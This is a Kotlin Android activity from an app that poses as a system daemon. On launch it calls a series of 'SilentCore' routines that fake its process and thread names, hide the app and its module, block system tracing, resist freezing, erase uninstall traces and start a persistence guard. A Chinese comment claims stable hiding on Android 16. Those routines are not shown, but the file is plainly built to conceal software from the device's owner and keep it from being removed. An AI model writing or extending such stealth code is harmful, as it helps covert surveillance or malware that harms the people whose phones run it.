package com.android.system.daemon

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // 全底层隐藏 安卓16稳定生效
        SilentCore.randomFakeProcess()
        SilentCore.randomThreadName()
        SilentCore.hideBase()
        SilentCore.hideDeep()
        SilentCore.blockSystemTrace()
        SilentCore.hideModule()
        SilentCore.antiFreeze()
        SilentCore.hideUninstallTrace()
        SilentCore.startDualGuard()
    }

    override fun onBackPressed() {
        moveTaskToBack(true)
        super.onBackPressed()
    }
}
